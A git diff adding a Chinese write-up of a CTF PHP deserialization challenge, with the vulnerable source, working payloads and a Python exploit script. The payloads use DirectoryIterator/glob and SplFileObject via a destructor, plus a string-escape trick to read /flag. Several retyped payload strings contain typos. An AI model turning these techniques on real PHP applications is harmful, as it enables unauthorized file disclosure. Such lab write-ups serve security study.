@@ -753,6 +753,193 @@ if __name__ == '__main__':
 
 
 
+# NSSCTF prize5 - 反序列化
+
+题目
+```php
+<?php
+namespace myapp;
+error_reporting(0);
+
+class catalogue{
+    public $class;
+    public $data;
+    public function __construct()
+    {
+        $this->class = "error";
+        $this->data = "hacker";
+    }
+    public function __destruct()
+    {
+        echo new $this->class($this->data);
+    }
+}
+class error{
+    public function __construct($OTL)
+    {
+        $this->OTL = $OTL;
+        echo ("hello ".$this->OTL);
+    }
+} 
+class escape{
+    public $name = 'OTL';
+    public $phone = '123666';
+    public $email = 'sweet@OTL.com';
+}
+function abscond($string) {
+    $filter = array('NSS', 'CTF', 'OTL_QAQ', 'hello');
+    $filter = '/' . implode('|', $filter) . '/i';
+    return preg_replace($filter, 'hacker', $string);
+}
+if(isset($_GET['cata'])){
+    if(!preg_match('/object/i',$_GET['cata'])){
+        unserialize($_GET['cata']);
+    }
+    else{
+        $cc = new catalogue();
+        unserialize(serialize($cc));
+    }
+    if(isset($_POST['name'])&&isset($_POST['phone'])&&isset($_POST['email'])){
+        if (preg_match("/flag/i",$_POST['email'])){
+            die("nonono,you can not do that!");
+        }
+        $abscond = new escape();
+        $abscond->name = $_POST['name'];
+        $abscond->phone = $_POST['phone'];
+        $abscond->email = $_POST['email'];
+        $abscond = serialize($abscond);
+        $escape = get_object_vars(unserialize(abscond($abscond)));
+        if(is_array($escape['phone'])){
+            echo base64_encode(file_get_contents($escape['email']));
+        }
+        else{
+            echo "I'm sorry to tell you that you are wrong";
+        }
+    }
+}
+else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+## 关键处1
+```php
+    if(!preg_match('/object/i',$_GET['cata'])){
+        unserialize($_GET['cata']);
+    }
+    else{
+        $cc = new catalogue();
+        unserialize(serialize($cc));
+    }
+```
+
+通过观察存在的类，有一个析构函数的类可以直接利用外，没有其他可以使用。通过观察catalogue类的析构函数，是new一个新类，然后进行echo的操作，这里可以直接联想到原生类的利
+用中目录读取文件的类 Directorylterator 类、Filesystemlterator 类以及GlobIterator类
+
+这里只能回显一个文件，需要配合glob协议链接：PHP：glob://-Manual）使用，通过*号来匹配想要的文件名，Payload如下
+https://www.php.net/manual/zh/wrappers.glob.php
+
+
+```php
+<?php
+error_reporting(0);
+
+class catalogue{
+    public $class;
+    public $data;
+    public function __construct()
+    {
+        $this->class = "DirectoryIterator";
+        $this->data = "glob:///*f*";
+    }
+}
+
+echo serialize(new catalogue());
+// O:9:"catalogue":2:{s:5:"class";s:17:"DirectoryIterator";s:4:"data";s:11:"glob:///*f*";}
+```
+
+`?cata=O:9:"catalogue":2:{s:5:"class";s:17:"DirectoryIterator";s:4:"data";s:11:"glob:///*f*";}`
+
+得到文件地址为 /flag
+
+## 第二步：读flag文件 
+
+### 非预期
+第二步:读flag文件非预期这里可以直接进行利用catalogue类的析构函数,通过 SplFileObjet类读取flag文件的内容,Payload如下
+
+`?cata=0:9:"catalogue":2:{s:5:"cLass";S:13:"SpLFile0b\6Aect";s:4:"data";s:5:"/flag":}`
+
+
+__原理：__
+<div>?cata=0:9:"catalogue":2:{s:5:"cLass";s:13:"SpLFile0bject";s:4:"data";s:5:"/flag":}</div>
+使用大写S可支持16进制解析
+<div>?cata=0:9:"catalogue":2:{s:5:"cLass";<span style="color: red;">S</span>:13:"SpLFile0b\6Aect";s:4:"data";s:5:"/flag":}</div>
+
+### 预期
+
+```php
+<?php
+class escape{
+    public $name = 'OTL';
+    public $phone = array(1);
+    public $email = '/flag';
+}
+
+$a = new escape();
+echo serialize($a);
+```
+
+`O:6:"escape":3:{s:4:"name";s:3:"OTL";s:5:"phone";a:1:{i:0;i:1;}s:5:"email";s:5:"/flag";}`
+
+由于会在email中检测flag过滤, 不能直接写。
+phone要求array
+那我们使用name参数通过abscond来绕过。
+
+知识点: 反序列化的字符串后加任意字母不影响反序列化
+
+```php
+<?php
+class escape{
+    public $name = 'OTL';
+}
+
+$escape = serialize(new escape()) . 'aasdfdsf';
+var_dump(unserialize($escape));
+```
+
+`O:6:"escape":1:{s:4:"name";s:3:"OTL";}123123123` 这种正常能解析的在后面添加字符不影响解析。所以替换后前面的符合反序列化信息即可。
+
+保证 s:数字 长度正确。 
+```
+NSS/CTF->hacker,长度-3
+OTL_QAQ->hacker,长度+1
+hello->hacker,长度-1
+
+";s:5:"phone";a:1:{i:0;i:1;}s:5:"email";s:5:"/flag";}   长度为53
+53/3 = 17 余2
+用 17个CTF + 2个hello。正好吃掉53个字符
+```
+
+预期继续往下看代码,可以知道是一个反序列化的逃逸,最后构造的Payload如下
+
+`CTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFhelLohelLo";s:5:"phone";a:1:{i:8;i:1;s:5:"email";s:5:"/flag":}`
+
+
+```python
+from requests_html import HTMLSession
+
+s = HTMLSession()
+data = {
+    "name": 'CTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFhellohello";s:5:"phone";a:1:{i:0;i:1;}s:5:"email";s:5:"/flag";}',
+    'phone': '123',
+    'email': '12'
+}
+res = s.post('http://11304-eb1d33fb-a8f1-403a.nss.ctfer.vip:9080/?cata=123', data=data)
+import base64
+print(base64.b64decode(res.content))
+```
+
 # SWPU新生赛 // 2021WLLMCTF新生赛
 
 
@@ -763,3 +950,5 @@ if __name__ == '__main__':
 
 https://blog.csdn.net/qq_42880719/
 加2021WLLMCTF新生赛官方WP.pdf
+
+
